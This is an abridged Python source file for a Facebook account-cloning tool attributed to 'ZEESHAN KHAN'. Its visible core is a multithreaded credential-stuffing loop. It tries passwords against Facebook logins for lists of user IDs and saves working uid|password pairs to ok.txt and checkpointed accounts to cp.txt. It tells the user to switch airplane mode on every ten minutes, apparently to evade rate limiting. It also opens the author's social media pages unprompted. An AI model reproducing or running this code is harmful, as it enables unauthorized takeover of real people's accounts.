...
def notice():
	...
	runtxt("\033[0;97m Key Inbox Krein")
	os.system("xdg-open www.facebook.com/zkkhan9211")
	subprocess.check_output(["am", "start", "www.facebook.com/zkkhan9211"])
...
───────────────────────────────────────────────────────× 
    """)
		print("%s [%s•%s] %sTOOL NAME : %sZK2009 Cloning Tool"%(G,R,G,B,G))
		print("%s [%s•%s] %sVERSION   : %s6"%(G,R,G,B,G))
		print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
		print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 
		print("───────────────────────────────────────────────────────× ")
		print(" \t\033[1;97m[\x1b[1;97m\x1b[1;41m LIKE MY PAGE \x1b[0m\x1b[1;97m] \033[1;37m ")
		subprocess.check_output(["am", "start", "https://www.facebook.com/satangamingofficial"])
		print("───────────────────────────────────────────────────────× ")
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\033[0;92m[=×>]\033[0;92m NOTE : HAR 10 MIN BAD AIRPLAN MOD/FLIGHT MODE ON KRO ")
				print("\033[0;97m───────────────────────────────────────────────────────× ")
				for user in self.id:
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=ZK=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=ZK=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=ZK=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=ZK=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print("")
		print("\n [*] Author    :ZEESHAN KHAN ")
		print(" [*] Team      : BHHZK9211 \n")
		print(" [ Social Media  ] 9211\n")
		print(" [*] Facebook  : https://facebook.com/zkkhan9211 ")
		print(" [*] Instagram : https://instagram.com/zk_9211 ")
		exit(" [*] GitHub    : https://github.com/BHHZK9211 ")
	else:
		Main()
